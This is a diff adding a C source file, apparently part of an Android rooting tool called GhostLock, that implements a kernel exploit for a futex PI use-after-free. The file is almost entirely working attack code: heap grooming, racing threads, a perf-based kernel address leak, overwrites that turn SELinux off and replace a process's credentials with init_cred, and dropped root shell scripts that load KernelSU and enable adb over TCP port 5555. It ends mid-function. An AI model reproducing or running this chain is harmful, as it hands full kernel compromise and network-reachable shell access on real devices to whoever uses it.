@@ -1,0 +1,844 @@
+/*
+ * GhostLock — CVE-2026-43499 futex PI UAF exploit
+ *
+ * Phase 1: Write 1 — SELinux permissive (child-node PI write)
+ * Phase 2: Write 2 — cred = init_cred (child-node PI write via perf task leak)
+ */
+
+#include "common.h"
+#include "offsets.h"
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <linux/perf_event.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/utsname.h>
+#include <poll.h>
+
+static const struct kernel_offsets *active_offsets = NULL;
+
+/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
+#undef SELINUX_ENFORCING_OFF
+#undef INIT_CRED_OFF
+#undef INIT_TASK_OFF
+#undef INIT_UTS_NS_OFF
+#undef EMPTY_ZERO_PAGE_OFF
+#undef ROOT_TASK_GROUP_OFF
+#undef KPTR_RESTRICT_OFF
+#undef SELINUX_BLOB_SIZES_OFF
+#undef SECURITY_HOOK_HEADS_OFF
+#undef KMALLOC_CACHES_OFF
+#undef ANON_PIPE_BUF_OPS_OFF
+#undef ASHMEM_MISC_FOPS_OFF
+#undef ASHMEM_FOPS_OFF
+#undef ASHMEM_IOCTL_OFF
+#undef ASHMEM_COMPAT_IOCTL_OFF
+#undef ASHMEM_MMAP_OFF
+#undef ASHMEM_OPEN_OFF
+#undef ASHMEM_RELEASE_OFF
+#undef ASHMEM_SHOW_FDINFO_OFF
+#undef CONFIGFS_READ_ITER_OFF
+#undef CONFIGFS_BIN_WRITE_ITER_OFF
+#undef COPY_SPLICE_READ_OFF
+#undef NOOP_LLSEEK_OFF
+#undef CAP_CAPABLE_ACTIVE_OFF
+#undef SLIDE_NFULNL_LOGGER_OFF
+#undef SLIDE_LOGGERS_0_1_OFF
+#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
+#undef SLIDE_SYSCTL_BOOTID_OFF
+
+#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
+#define INIT_CRED_OFF                 active_offsets->off_init_cred
+#define INIT_TASK_OFF                 active_offsets->off_init_task
+#define INIT_UTS_NS_OFF               active_offsets->off_init_uts_ns
+#define EMPTY_ZERO_PAGE_OFF           active_offsets->off_empty_zero_page
+#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
+#define KPTR_RESTRICT_OFF             active_offsets->off_kptr_restrict
+#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
+#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
+#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
+#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
+#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
+#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
+#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
+#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
+#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
+#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
+#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
+#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
+#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
+#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
+#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
+#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
+#define CAP_CAPABLE_ACTIVE_OFF        active_offsets->off_cap_capable_active
+#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
+#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
+#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id
+
+static int select_offsets(void) {
+  struct utsname uts;
+  if (uname(&uts) < 0) return -1;
+  pr_info("kernel: %s\n", uts.release);
+  for (int i = 0; known_offsets[i].uname_r; i++) {
+    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
+      active_offsets = &known_offsets[i];
+      pr_success("offsets matched: %s\n", active_offsets->uname_r);
+      return 0;
+    }
+  }
+  pr_error("no offsets for kernel: %s\n", uts.release);
+  pr_error("add this kernel to offsets.h and rebuild\n");
+  return -1;
+}
+
+static struct timespec t0;
+static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
+static double timer_ms(void) {
+  struct timespec now;
+  clock_gettime(CLOCK_MONOTONIC, &now);
+  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
+}
+#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)
+
+extern int pselect_custom_write;
+extern uintptr_t pselect_custom_target;
+extern uintptr_t pselect_custom_value;
+extern int pselect_child_node;
+void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
+void clear_pselect_write(void);
+
+uint32_t f_wait;
+uint32_t f_pi_target;
+uint32_t f_pi_chain;
+atomic_int waiter_ready;
+atomic_int waiter_waiting;
+atomic_int owner_started;
+atomic_int owner_chain_done;
+atomic_int route_done;
+atomic_int waiter_tid;
+atomic_int punch_consume_go;
+atomic_int punch_consume_stop;
+atomic_int consumer_calls;
+atomic_int consumer_success;
+atomic_int main_route_delay_usec;
+atomic_int pipe_prepare_request;
+atomic_int pipe_prepare_done;
+int memfd_leak;
+
+void *waiter_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+  int tid = (int)syscall(SYS_gettid);
+  atomic_store(&waiter_tid, tid);
+  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
+    pr_error("waiter lock chain errno=%d\n", errno);
+  atomic_store(&waiter_ready, 1);
+  while (!atomic_load(&owner_started)) usleep(1000);
+  struct timespec timeout;
+  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
+  timeout.tv_sec += ROUTE_WAIT_SECONDS;
+  atomic_store(&waiter_waiting, 1);
+  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
+  do_pselect_fake_lock_route();
+  atomic_store(&route_done, 1);
+  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  while (!atomic_load(&owner_chain_done)) usleep(1000);
+  return NULL;
+}
+
+void *owner_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
+  while (!atomic_load(&waiter_ready)) usleep(1000);
+  atomic_store(&owner_started, 1);
+  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  atomic_store(&owner_chain_done, 1);
+  for (;;) sleep(1);
+}
+
+void *consumer_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+  pin_to_core(CONSUMER_CORE);
+  int seen = 0;
+  while (!atomic_load(&punch_consume_stop)) {
+    int seq = atomic_load(&punch_consume_go);
+    if (seq == 0 || seq == seen) {
+      __asm__ volatile("yield" ::: "memory");
+      continue;
+    }
+    seen = seq;
+    int tid = atomic_load(&waiter_tid);
+    int calls_this_seq = 0;
+    while (!atomic_load(&punch_consume_stop) &&
+           atomic_load(&punch_consume_go) == seq) {
+      int delay_usec = atomic_load(&main_route_delay_usec);
+      if (delay_usec > 0) usleep((useconds_t)delay_usec);
+      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
+        if (atomic_load(&punch_consume_stop) ||
+            atomic_load(&punch_consume_go) != seq) break;
+        atomic_fetch_add(&consumer_calls, 1);
+        errno = 0;
+        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
+        if (sched_ret != 0) {
+          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
+          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
+          if (fret == 0) {
+            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+            sched_ret = 0;
+          }
+        }
+        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
+        calls_this_seq++;
+        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
+          atomic_store(&punch_consume_go, 0);
+          break;
+        }
+      }
+    }
+  }
+  return NULL;
+}
+
+void reset_main_route_state(void) {
+  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
+  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
+  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
+  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
+  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
+  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
+  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
+  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
+  cfi_last_step = 0; cfi_last_errno = 0;
+}
+
+void run_main_route_threads(void) {
+  reset_main_route_state();
+  pthread_t waiter, owner, consumer;
+  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
+  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
+  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
+  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
+    usleep(1000);
+  usleep(50000);
+  errno = 0;
+  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
+  while (!atomic_load(&route_done)) usleep(5000);
+}
+
+static int do_one_write(uintptr_t target, const char *desc, int mode) {
+  pr_info("=== %s === target=0x%016zx mode=%d\n", desc, target, mode);
+  pselect_child_node = 1;
+  set_pselect_write_mode(target, 0, mode);
+  TIMER("  heap spray start");
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+  if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
+  TIMER("  heap spray done");
+  run_main_route_threads();
+  TIMER("  PI route done");
+  clear_pselect_write();
+  return 1;
+}
+
+static int check_selinux_off(void) {
+  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
+  if (efd < 0) return 1;
+  char b[4] = {0};
+  read(efd, b, sizeof(b));
+  close(efd);
+  return b[0] == '0';
+}
+
+static void slab_drain(void) {
+  struct timespec up;
+  clock_gettime(CLOCK_BOOTTIME, &up);
+  int waves = (up.tv_sec > 60) ? 5 : 2;
+  int batch = (up.tv_sec > 60) ? 400 : 200;
+  for (int wave = 0; wave < waves; wave++) {
+    pid_t *drain = calloc(batch, sizeof(pid_t));
+    int n = 0;
+    for (int i = 0; i < batch; i++) {
+      drain[i] = fork();
+      if (drain[i] == 0) {
+        /* The W1 worker can be forcibly timed out.  These temporary drain
+         * children must not survive that event and poison every later W1. */
+        prctl(PR_SET_PDEATHSIG, SIGKILL);
+        if (getppid() == 1) _exit(0);
+        pause();
+        _exit(0);
+      }
+      if (drain[i] > 0) n++;
+    }
+    for (int i = 0; i < n; i++) {
+      kill(drain[i], SIGKILL);
+      waitpid(drain[i], NULL, 0);
+    }
+    free(drain);
+    sched_yield();
+  }
+}
+
+/* A failed PI route leaves its owner/consumer threads alive.  Isolate every
+ * write attempt so the next attempt starts without those shared futex states.
+ * CPH2655 may take nearly 40 seconds to complete a valid route, so do not
+ * prematurely kill a healthy worker at the old 20-second boundary. */
+#define WRITE_ATTEMPT_TIMEOUT_MSEC 60000
+
+static int run_isolated_write(uintptr_t target, const char *desc, int mode,
+                              int attempt) {
+  pid_t pid = fork();
+  if (pid < 0) {
+    pr_error("%s attempt %d: fork failed errno=%d\n", desc, attempt, errno);
+    return 0;
+  }
+  if (pid == 0) {
+    /* If the launcher is killed by Magica's userspace restart, do not leave
+     * an in-progress write worker (and its futex state) behind. */
+    prctl(PR_SET_PDEATHSIG, SIGKILL);
+    if (getppid() == 1) _exit(1);
+    slab_drain();
+    int ran = do_one_write(target, desc, mode);
+    _exit(ran ? 0 : 1);
+  }
+
+  int status = 0;
+  for (int elapsed = 0; elapsed < WRITE_ATTEMPT_TIMEOUT_MSEC; elapsed += 10) {
+    pid_t waited = waitpid(pid, &status, WNOHANG);
+    if (waited == pid) {
+      if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
+        pr_error("%s attempt %d: worker exited status=%d\n", desc, attempt,
+                 status);
+        return 0;
+      }
+      return 1;
+    }
+    if (waited < 0) {
+      pr_error("%s attempt %d: waitpid failed errno=%d\n", desc, attempt,
+               errno);
+      return 0;
+    }
+    usleep(10000);
+  }
+
+  pr_error("%s attempt %d: timed out; terminating worker\n", desc, attempt);
+  kill(pid, SIGKILL);
+  waitpid(pid, NULL, 0);
+  return 0;
+}
+
+static int run_w1_attempt(int attempt) {
+  return run_isolated_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1,
+                            attempt);
+}
+
+/* The bootstrapper keeps only a compact state record under its own root-owned
+ * directory.  Temporary scripts and legacy shell-setup files must not survive
+ * a completed or failed run in /data/local/tmp. */
+#define BRIDGE_STATE_DIR "/data/adb/anchor"
+#define ROOT_SCRIPT_PATH BRIDGE_STATE_DIR "/bootstrap.sh"
+
+static void prepare_bridge_state_dir(void) {
+  mkdir("/data/adb", 0700);
+  mkdir(BRIDGE_STATE_DIR, 0700);
+  chmod(BRIDGE_STATE_DIR, 0700);
+}
+
+static void write_bridge_state(const char *value) {
+  prepare_bridge_state_dir();
+  int fd = open(BRIDGE_STATE_DIR "/bootstrap.state",
+                O_WRONLY | O_CREAT | O_TRUNC, 0600);
+  if (fd < 0) return;
+  dprintf(fd, "result=%s\n", value);
+  close(fd);
+  chmod(BRIDGE_STATE_DIR "/bootstrap.state", 0600);
+}
+
+static void cleanup_tmp_compat_files(void) {
+  unlink("/data/local/tmp/.ghostlock_root.sh");
+  unlink("/data/local/tmp/.ghostlock_w1");
+  unlink("/data/local/tmp/a/ghostlock_postroot.log");
+  unlink("/data/local/tmp/a/adbkey");
+  unlink("/data/local/tmp/a/adbkey.pub");
+  unlink("/data/local/tmp/a/e");
+}
+
+/* `late-load` deliberately changes the process environment and Magica may also
+ * restart user space.  Do not put essential post-root work in the shell which
+ * starts it: that shell can disappear mid-flight.  ksud runs every executable
+ * in /data/adb/late-load.d synchronously after it has loaded KernelSU and its
+ * sepolicy rules, but before it applies the dynamic-manager configuration.
+ * Install a one-shot handoff there while the W2 child is root. */
+static void write_lateload_recovery_script(void) {
+  const char *dir = "/data/adb/late-load.d";
+  const char *path = "/data/adb/late-load.d/99-anchor-recover.sh";
+  prepare_bridge_state_dir();
+  mkdir(dir, 0755);
+
+  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+  if (fd < 0) {
+    pr_error("cannot install late-load recovery script errno=%d\n", errno);
+    return;
+  }
+
+  const char *script =
+    "#!/system/bin/sh\n"
+    "STATE_DIR=/data/adb/anchor\n"
+    "STATE=$STATE_DIR/bootstrap.state\n"
+    "mkdir -p \"$STATE_DIR\" && chmod 700 \"$STATE_DIR\"\n"
+    "state() { printf 'result=%s\\n' \"$1\" > \"$STATE\"; chmod 600 \"$STATE\"; }\n"
+    "state late-load-running\n"
+    "KSUD=/data/adb/ksud\n"
+    "APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed -n 's/^package://p' | head -n 1)\n"
+    "if [ -x \"$KSUD\" ] && [ -n \"$APK\" ]; then\n"
+    "  \"$KSUD\" kernel dynamic-manager set-apk \"$APK\" >/dev/null 2>&1\n"
+    "fi\n"
+    "if [ -x \"$KSUD\" ]; then\n"
+    "  \"$KSUD\" resetprop -p persist.adb.tcp.port 5555 >/dev/null 2>&1\n"
+    "  \"$KSUD\" resetprop service.adb.tcp.port 5555 >/dev/null 2>&1\n"
+    "fi\n"
+    "if command -v load_policy >/dev/null 2>&1; then\n"
+    "  load_policy /sys/fs/selinux/policy >/dev/null 2>&1\n"
+    "fi\n"
+    "OPTIONS=/data/user/0/com.anchor.bootstrap/no_backup/options.conf\n"
+    "if grep -qx 'disable_usb_debugging=1' \"$OPTIONS\" 2>/dev/null; then\n"
+    "  settings put global adb_enabled 0 >/dev/null 2>&1\n"
+    "fi\n"
+    "state late-load-complete\n"
+    "rm -f \"$0\"\n";
+
+  if (write(fd, script, strlen(script)) != (ssize_t)strlen(script))
+    pr_error("cannot write late-load recovery script errno=%d\n", errno);
+  close(fd);
+  chmod(path, 0700);
+}
+
+static void write_root_script(void) {
+  prepare_bridge_state_dir();
+  int sfd = open(ROOT_SCRIPT_PATH, O_WRONLY|O_CREAT|O_TRUNC, 0700);
+  if (sfd < 0) return;
+  const char *script =
+    "#!/system/bin/sh\n"
+    "STATE_DIR=/data/adb/anchor\n"
+    "STATE=$STATE_DIR/bootstrap.state\n"
+    "mkdir -p \"$STATE_DIR\" && chmod 700 \"$STATE_DIR\"\n"
+    "state() { printf 'result=%s\\n' \"$1\" > \"$STATE\"; chmod 600 \"$STATE\"; }\n"
+    "cleanup() { rm -f \"$0\" /data/local/tmp/.ghostlock_root.sh /data/local/tmp/.ghostlock_w1 /data/local/tmp/a/ghostlock_postroot.log /data/local/tmp/a/adbkey /data/local/tmp/a/adbkey.pub /data/local/tmp/a/e; }\n"
+    "trap cleanup EXIT\n"
+    "rm -f /data/local/tmp/a/ghostlock_postroot.log\n"
+    "state root-handoff-running\n"
+    "KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+    "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
+    "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+    "  state root-ready\n"
+    "elif [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
+    "  chmod 755 \"$KSUD\" 2>/dev/null\n"
+    "  KVER=$(uname -r | cut -d. -f1-2)\n"
+    "  AVER=$(uname -r | grep -o 'android[0-9]*')\n"
+    "  KMI=\"${AVER}-${KVER}\"\n"
+    "  mkdir -p /data/adb/ksu 2>/dev/null\n"
+    "  setsid \"$KSUD\" late-load --kmi \"$KMI\" </dev/null >/dev/null 2>&1 &\n"
+    "  for w in $(seq 1 30); do\n"
+    "    grep -q kernelsu /proc/modules 2>/dev/null && break\n"
+    "    sleep 1\n"
+    "  done\n"
+    "  grep -q kernelsu /proc/modules 2>/dev/null && state root-ready || state root-unavailable\n"
+    "else\n"
+    "  state root-unavailable\n"
+    "fi\n"
+    "exit 0\n";
+  write(sfd, script, strlen(script));
+  close(sfd);
+  chmod(ROOT_SCRIPT_PATH, 0700);
+}
+
+/* perf_find_task - only used when perf is available (shell context) */
+static uintptr_t perf_find_task(void) {
+  struct perf_event_attr pe;
+  memset(&pe, 0, sizeof(pe));
+  pe.type = PERF_TYPE_SOFTWARE;
+  pe.size = sizeof(pe);
+  pe.config = PERF_COUNT_SW_CPU_CLOCK;
+  pe.sample_period = 5000;
+  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
+  pe.sample_regs_intr = (1ULL << 32) - 1;
+  pe.disabled = 1;
+  pe.exclude_user = 1;
+  pe.exclude_hv = 1;
+  pe.exclude_idle = 1;
+
+  errno = 0;
+  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
+  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); return 0; }
+  size_t msz = 4096 * (1 + 32);
+  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); close(fd); return 0; }
+  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
+  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+  struct perf_event_mmap_page *hdr = buf;
+  uint64_t head = hdr->data_head;
+  __sync_synchronize();
+  char *base = (char *)buf + 4096;
+  size_t dsz = 4096 * 32;
+  uint64_t pos = hdr->data_tail;
+  uintptr_t cands[256]; int nc = 0;
+  while (pos < head && nc < 256) {
+    struct perf_event_header *ev = (void *)(base + (pos % dsz));
+    if (ev->size == 0) break;
+    if (ev->type == PERF_RECORD_SAMPLE) {
+      char *p = (char *)ev + sizeof(*ev);
+      p += 8; /* skip IP */
+      uint64_t abi = *(uint64_t *)p; p += 8;
+      if (abi == 1 || abi == 2) {
+        uint64_t *regs = (uint64_t *)p;
+        for (int i = 0; i < 32 && nc < 256; i++) {
+          uint64_t v = regs[i];
+          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
+            cands[nc++] = v;
+        }
+      }
+    }
+    pos += ev->size;
+  }
+  hdr->data_tail = head; munmap(buf, msz); close(fd);
+  if (!nc) return 0;
+  uintptr_t best = 0; int best_cnt = 0;
+  for (int i = 0; i < nc; i++) {
+    int cnt = 0;
+    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
+    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
+  }
+  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
+  return best;
+}
+
+struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };
+
+static int read_exact_timeout(int fd, void *buf, size_t size, int timeout_msec) {
+  unsigned char *p = buf;
+  size_t done = 0;
+  while (done < size && timeout_msec > 0) {
+    struct pollfd pfd = {.fd = fd, .events = POLLIN | POLLHUP};
+    int step = timeout_msec > 100 ? 100 : timeout_msec;
+    int ready = poll(&pfd, 1, step);
+    timeout_msec -= step;
+    if (ready < 0) {
+      if (errno == EINTR) continue;
+      return 0;
+    }
+    if (ready == 0) continue;
+    ssize_t got = read(fd, p + done, size - done);
+    if (got <= 0) return 0;
+    done += (size_t)got;
+  }
+  return done == size;
+}
+
+static void close_fd(int *fd) {
+  if (*fd >= 0) {
+    close(*fd);
+    *fd = -1;
+  }
+}
+
+/* The candidate child blocks waiting for C/G.  Every failure path must release
+ * it before retrying, otherwise the next UI click inherits a stale task and
+ * its open pipe endpoints. */
+static void dispose_candidate_child(struct child_pipes *p, pid_t child) {
+  if (p->cmd_w >= 0) (void)write(p->cmd_w, "G", 1);
+  close_fd(&p->task_r);
+  close_fd(&p->cmd_w);
+  close_fd(&p->uid_r);
+
+  if (child <= 0) return;
+  for (int elapsed = 0; elapsed < 2000; elapsed += 20) {
+    pid_t waited = waitpid(child, NULL, WNOHANG);
+    if (waited == child || waited < 0) return;
+    usleep(20000);
+  }
+  kill(child, SIGKILL);
+  waitpid(child, NULL, 0);
+}
+
+static void child_main(struct child_pipes *p) {
+  /* A failed launcher must not leave a candidate task alive for a later UI
+   * retry.  The root-script child is also reaped before this child returns. */
+  prctl(PR_SET_PDEATHSIG, SIGKILL);
+  if (getppid() == 1) _exit(1);
+  close(p->task_r); close(p->cmd_w); close(p->uid_r);
+  uintptr_t my_task = perf_find_task();
+  write(p->task_w, &my_task, sizeof(my_task));
+  close(p->task_w);
+  if (!my_task) _exit(1);
+  char cmd;
+  while (read(p->cmd_r, &cmd, 1) == 1) {
+    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
+    else if (cmd == 'G') break;
+  }
+  close(p->cmd_r); close(p->uid_w);
+  if (getuid() != 0) _exit(1);
+  /* /data/adb is inaccessible to the shell process.  Create both the
+   * root-owned state directory and its short-lived handoff script only after
+   * the credential transition has completed. */
+  write_root_script();
+  if (access(ROOT_SCRIPT_PATH, X_OK) != 0) {
+    write_bridge_state("root-script-unavailable");
+    _exit(1);
+  }
+  write_lateload_recovery_script();
+  pid_t gc = fork();
+  if (gc == 0) {
+    int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
+    if (efd >= 0) { write(efd, "0", 1); close(efd); }
+    execl("/system/bin/sh", "sh", ROOT_SCRIPT_PATH, NULL);
+    _exit(1);
+  }
+  if (gc > 0) waitpid(gc, NULL, 0);
+  cleanup_tmp_compat_files();
+}
+
+static pid_t spawn_child(struct child_pipes *p) {
+  *p = (struct child_pipes){
+      .task_r = -1, .task_w = -1, .cmd_r = -1,
+      .cmd_w = -1, .uid_r = -1, .uid_w = -1};
+  int p1[2], p2[2], p3[2];
+  if (pipe(p1) < 0) return -1;
+  if (pipe(p2) < 0) {
+    close(p1[0]); close(p1[1]);
+    return -1;
+  }
+  if (pipe(p3) < 0) {
+    close(p1[0]); close(p1[1]); close(p2[0]); close(p2[1]);
+    return -1;
+  }
+  p->task_r = p1[0]; p->task_w = p1[1];
+  p->cmd_r = p2[0]; p->cmd_w = p2[1];
+  p->uid_r = p3[0]; p->uid_w = p3[1];
+  pid_t child = fork();
+  if (child < 0) {
+    close_fd(&p->task_r); close_fd(&p->task_w);
+    close_fd(&p->cmd_r); close_fd(&p->cmd_w);
+    close_fd(&p->uid_r); close_fd(&p->uid_w);
+    return -1;
+  }
+  if (child == 0) { child_main(p); _exit(1); }
+  close(p->task_w); close(p->cmd_r); close(p->uid_w);
+  return child;
+}
+
+int run_exploit(int argc, char **argv) {
+  (void)argc; (void)argv;
+  disable_rseq_for_thread();
+  set_unbuffer();
+  set_limit();
+
+  if (!active_offsets && select_offsets() < 0) return 1;
+
+  log_startup_context();
+  init_ashmem_path();
+  pin_to_core(CORE);
+
+  kaslr_slide = 0;
+  kaslr_base = KIMAGE_TEXT_BASE;
+  kaslr_done = 1;
+
+  timer_reset();
+  TIMER("exploit start");
+
+  /* Phase 1: Disable SELinux */
+  int selinux_ok = check_selinux_off();
+  if (!selinux_ok) {
+    for (int att = 1; att <= 5 && !selinux_ok; att++) {
+      pr_info("Write 1 attempt %d/5\n", att);
+      run_w1_attempt(att);
+      usleep(100000);
+      if (check_selinux_off()) { pr_success("SELinux DISABLED\n"); selinux_ok = 1; }
+    }
+    if (!selinux_ok) { pr_error("Write 1 failed\n"); return 1; }
+    TIMER("Write 1 complete");
+  } else {
+    pr_success("SELinux already off\n");
+  }
+
+  /* Phase 2: Find child task_struct + cred overwrite */
+  slab_drain();
+  TIMER("pre-W2 drain");
+
+  struct child_pipes pipes;
+  pid_t child = spawn_child(&pipes);
+  if (child < 0) { pr_error("fork failed\n"); cleanup_tmp_compat_files(); return 1; }
+
+  uintptr_t child_task = 0;
+  if (!read_exact_timeout(pipes.task_r, &child_task, sizeof(child_task), 5000))
+    child_task = 0;
+  close_fd(&pipes.task_r);
+  TIMER("perf_find_task done");
+
+  if (!child_task) {
+    /* perf failed (seccomp?) — retry once */
+    pr_info("perf returned 0, retrying...\n");
+    dispose_candidate_child(&pipes, child);
+    child = spawn_child(&pipes);
+    if (child < 0) { pr_error("retry fork failed\n"); cleanup_tmp_compat_files(); return 1; }
+    if (!read_exact_timeout(pipes.task_r, &child_task, sizeof(child_task), 5000))
+      child_task = 0;
+    close_fd(&pipes.task_r);
+  }
+
+  if (!child_task) {
+    pr_error("Cannot find task_struct (perf blocked by seccomp?)\n");
+    dispose_candidate_child(&pipes, child);
+    cleanup_tmp_compat_files();
+    return 1;
+  }
+
+  pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
+  pselect_child_node = 1;
+
+  int got_root = 0;
+  for (int round = 1; round <= 10 && !got_root; round++) {
+    pr_info("round %d/10: cred write\n", round);
+    if (!run_isolated_write(child_task + TASK_CRED_OFF, "W2: cred", 2,
+                            round))
+      continue;
+    usleep(50000);
+    uint32_t child_uid = 9999;
+    if (write(pipes.cmd_w, "C", 1) != 1 ||
+        !read_exact_timeout(pipes.uid_r, &child_uid, sizeof(child_uid), 2000)) {
+      pr_error("round %d: candidate child did not answer\n", round);
+      break;
+    }
+    pr_info("child uid = %u\n", child_uid);
+    if (child_uid == 0) { pr_success("child is root!\n"); got_root = 1; }
+  }
+
+  if (pipes.cmd_w >= 0) (void)write(pipes.cmd_w, "G", 1);
+  close_fd(&pipes.cmd_w);
+  close_fd(&pipes.uid_r);
+
+  if (!got_root) {
+    pr_error("failed after 10 rounds\n");
+    dispose_candidate_child(&pipes, child);
+    cleanup_tmp_compat_files();
+    return 1;
+  }
+
+  sleep(2);
+  TIMER("exploit complete");
+
+  /* Wait for KSU su to become available, then fix SELinux policycap */
+  int su_ready = 0;
+  pr_info("waiting for su...\n");
+  for (int i = 0; i < 60; i++) {
+    if (system("su -c 'id' > /dev/null 2>&1") == 0) {
+      pr_success("su ready, fixing SELinux policy\n");
+      system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
+      pr_success("load_policy done\n");
+      su_ready = 1;
+      break;
+    }
+    sleep(1);
+  }
+
+  return su_ready ? 0 : 1;
+}
+
+int install_embedded_wallpaper(void) { return 0; }
+
+static int run_write1_only(void);
+extern int mini_adb_shell(const char *cmd);
+
+/* This is overridden by the standalone app build. The official Manager
+ * package remains the dynamic-manager target in write_root_script(); only the
+ * binary executed by the remote shell belongs to the Bootstrap package. */
+#ifndef ANCHOR_BOOTSTRAP_PACKAGE
+#define ANCHOR_BOOTSTRAP_PACKAGE "com.anchor.bootstrap"
+#endif
+
+/* --bootstrap mode: the app process is seccomp-filtered.  With the one-time
+ * TCP ADB setup in place, enter the shell context before any exploit stage so
+ * W1 and W2 use the same execution environment as the proven adb-shell path.
+ */
+static int run_bootstrap(void) {
+  /* The app drains this process's stdout into its private diagnostic store.
